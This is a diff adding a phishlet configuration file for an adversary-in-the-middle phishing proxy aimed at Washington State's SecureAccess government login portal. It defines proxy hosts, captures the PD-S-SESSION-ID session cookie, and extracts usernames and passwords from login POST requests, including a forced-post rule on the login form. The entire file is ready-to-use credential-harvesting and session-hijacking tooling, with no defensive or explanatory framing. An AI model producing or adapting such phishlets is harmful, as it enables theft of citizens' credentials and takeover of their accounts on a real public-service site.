@@ -1,0 +1,29 @@
+name: 'login_secureaccess_washington'
+author: 'seamus@rtlphishletgen'
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'secureaccess', orig_sub: 'secureaccess', domain: 'wa.gov', session: true, is_landing: true}
+auth_tokens:
+  - domain: '.secureaccess.wa.gov'
+    keys:
+      - 'PD-S-SESSION-ID'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/myAccess/saw/select.do'
+login:
+  domain: 'secureaccess.wa.gov'
+  path: '/myAccess/saw/select.do'
+force_post:
+  - path: '/pkmslogin.form'
+    search:
+      - {key: 'username', search: '(.*)'}
+      - {key: 'password', search: '(.*)'}
+    type: 'post'
